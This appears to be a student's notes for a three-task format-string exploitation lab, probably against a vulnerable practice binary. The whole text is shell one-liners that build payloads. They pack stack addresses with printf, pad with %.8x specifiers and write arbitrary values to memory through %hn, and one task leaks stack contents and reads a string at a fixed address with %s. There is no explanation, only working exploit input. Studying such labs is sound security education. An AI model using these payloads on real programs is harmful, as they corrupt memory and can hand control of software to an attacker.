任务一:
echo$(printf "\xA6\xEC\xFF\xBF@@@@\xA4\xEC\xFF\xBF")_%.8x_%.8x_%.8x_%.8x_%.26199x%hn_%.4368x% hn > input

echo $(printf "\xA4\xEC\xFF\xBF@@@@\xA6\xEC\xFF\xBF")_%.8x_%.8x_%.8x_%.8x_%.48830x%hn_%.8125x% hn > input

任务二：
echo $(printf "\x3C\xEC\xFF\xBF@@@@\x44\xEC\xFF\xBF@@@@\x3E\xEC\xFF\xBF@@@@\x46\xEC\xFF\xBF")_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.19708x%hn_%.2698x%hn_%.24494x%hn_%.17x%hn > badfile

任务三:
echo ABCD%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_% .8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_% .8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x > msg

echo $(printf "\x40\x87\x04\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%s > msg